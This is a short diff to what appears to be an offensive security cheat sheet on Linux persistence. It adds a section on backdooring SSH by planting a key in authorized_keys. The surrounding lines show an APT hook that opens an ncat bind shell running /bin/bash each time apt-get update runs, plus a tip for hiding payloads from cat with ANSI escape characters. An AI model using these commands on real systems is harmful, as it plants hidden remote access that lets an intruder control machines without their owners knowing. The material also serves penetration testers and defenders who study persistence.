@@ -79,6 +79,14 @@ Next time "apt-get update" is done, your CMD will be executed!
 echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
 ```
 
+## Backdooring the SSH
+
+Add an ssh key into the `~/.ssh` folder.
+
+1. `ssh-keygen`
+2. write the content of `~/.ssh/id_rsa.pub` into `~/.ssh/authorized_keys`
+3. set the right permission, 700 for ~/.ssh and 600 for authorized_keys
+
 ## Tips
 
 Hide the payload with ANSI chars, the following chars will clear the terminal when using cat to display the content of your payload.
